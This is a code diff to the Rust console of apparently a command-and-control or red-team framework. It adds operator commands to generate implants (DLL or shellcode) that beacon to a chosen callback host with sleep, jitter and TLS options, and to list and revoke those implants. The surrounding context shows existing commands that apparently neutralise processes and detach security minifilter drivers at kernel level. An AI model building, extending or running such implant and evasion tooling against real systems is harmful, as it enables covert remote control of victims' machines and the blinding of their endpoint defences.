@@ -2437,6 +2437,67 @@ impl App {
                 self.send(Cmd::KernelNeutralize { pid });
             }
             "/detach-mf" => self.send(Cmd::KernelDetachMinifilter),
+            // ── Implant generation ──────────────────────────────────────
+            "/generate" => {
+                // /generate <callback> [port] [--sleep N] [--jitter N] [--tls/--no-tls] [--format dll|shellcode]
+                let parts = args.split_whitespace().collect::<Vec<_>>();
+                if parts.is_empty() {
+                    self.log("usage: /generate <callback> [port] [--sleep N] [--jitter N] [--format dll|shellcode]", Level::Warn);
+                    return;
+                }
+                let callback = parts[0].to_string();
+                let mut port: u16 = 8443;
+                let mut sleep: u32 = 60;
+                let mut jitter: u8 = 20;
+                let mut tls = true;
+                let mut format = "dll".to_string();
+                let mut i = 1;
+                while i < parts.len() {
+                    match parts[i] {
+                        "--sleep" => {
+                            i += 1;
+                            if let Some(v) = parts.get(i).and_then(|s| s.parse().ok()) { sleep = v; }
+                        }
+                        "--jitter" => {
+                            i += 1;
+                            if let Some(v) = parts.get(i).and_then(|s| s.parse().ok()) { jitter = v; }
+                        }
+                        "--tls" => tls = true,
+                        "--no-tls" => tls = false,
+                        "--format" => {
+                            i += 1;
+                            if let Some(f) = parts.get(i) { format = f.to_string(); }
+                        }
+                        _ => {
+                            // Try to parse as port number
+                            if let Ok(p) = parts[i].parse::<u16>() {
+                                port = p;
+                            }
+                        }
+                    }
+                    i += 1;
+                }
+                self.send(Cmd::GenerateImplant {
+                    callback,
+                    port,
+                    format,
+                    uri: "/beacon".into(),
+                    sleep,
+                    jitter,
+                    tls,
+                    features: 0,
+                });
+                self.log("generating implant...", Level::Info);
+            }
+            "/implants" => self.send(Cmd::FetchImplants),
+            "/revoke" => {
+                let pk = args.trim().to_string();
+                if pk.is_empty() {
+                    self.log("usage: /revoke <implant_pub>", Level::Warn);
+                    return;
+                }
+                self.send(Cmd::RevokeImplant { implant_pub: pk });
+            }
             other => self.log(
                 &format!("! unknown command {other} — try /help",),
                 Level::Err,
